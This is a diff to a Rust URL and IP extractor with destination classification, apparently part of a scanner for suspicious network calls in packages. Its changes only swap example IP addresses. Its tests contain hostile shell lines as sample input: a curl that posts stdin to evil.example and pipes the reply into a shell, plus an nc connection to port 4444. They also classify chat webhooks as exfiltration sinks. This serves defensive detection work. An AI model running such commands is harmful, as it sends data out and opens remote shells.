@@ -155,7 +155,7 @@ pub fn extract_urls(text: &str) -> Vec<String> {
             rest = &tail[scheme.len()..];
         }
     }
-    // bare IPv4 (e.g. `nc 45.77.12.9 4444`)
+    // bare IPv4 (e.g. `nc 203.0.113.7 4444`)
     for tok in text.split(|c: char| !(c.is_ascii_digit() || c == '.')) {
         if is_ipv4(tok) && !out.iter().any(|u| u.contains(tok)) {
             out.push(tok.to_string());
@@ -171,7 +171,7 @@ mod tests {
     #[test]
     fn hosts() {
         assert_eq!(host_of("https://user:pw@Example.COM:8443/x?y").as_deref(), Some("example.com"));
-        assert_eq!(host_of("45.77.12.9").as_deref(), Some("45.77.12.9"));
+        assert_eq!(host_of("203.0.113.7").as_deref(), Some("203.0.113.7"));
         assert_eq!(host_of("git+ssh://git@github.com/a/b.git").as_deref(), Some("github.com"));
         assert_eq!(host_of("https://§/x"), None);
         assert_eq!(host_of("just words"), None);
@@ -182,7 +182,7 @@ mod tests {
     fn classification() {
         let home = Home { hosts: vec!["esbuild.github.io".into()], github_repo: Some("evanw/esbuild".into()) };
         let c = |h: &str, u: &str| classify(h, u, &home).0;
-        assert_eq!(c("45.77.12.9", "https://45.77.12.9/c"), DestKind::RawIp);
+        assert_eq!(c("203.0.113.7", "https://203.0.113.7/c"), DestKind::RawIp);
         assert_eq!(c("127.0.0.1", "http://127.0.0.1:3000"), DestKind::Other);
         assert_eq!(c("discord.com", "https://discord.com/api/webhooks/1/abc"), DestKind::ChatWebhook);
         assert_eq!(c("api.telegram.org", "https://api.telegram.org/bot123/sendMessage"), DestKind::ChatWebhook);
@@ -200,8 +200,8 @@ mod tests {
 
     #[test]
     fn extracts_from_shell() {
-        let u = extract_urls("curl -s -X POST https://evil.example/c -d @- | sh; nc 45.77.12.9 4444");
+        let u = extract_urls("curl -s -X POST https://evil.example/c -d @- | sh; nc 203.0.113.7 4444");
         assert!(u.contains(&"https://evil.example/c".to_string()));
-        assert!(u.contains(&"45.77.12.9".to_string()));
+        assert!(u.contains(&"203.0.113.7".to_string()));
     }
 }
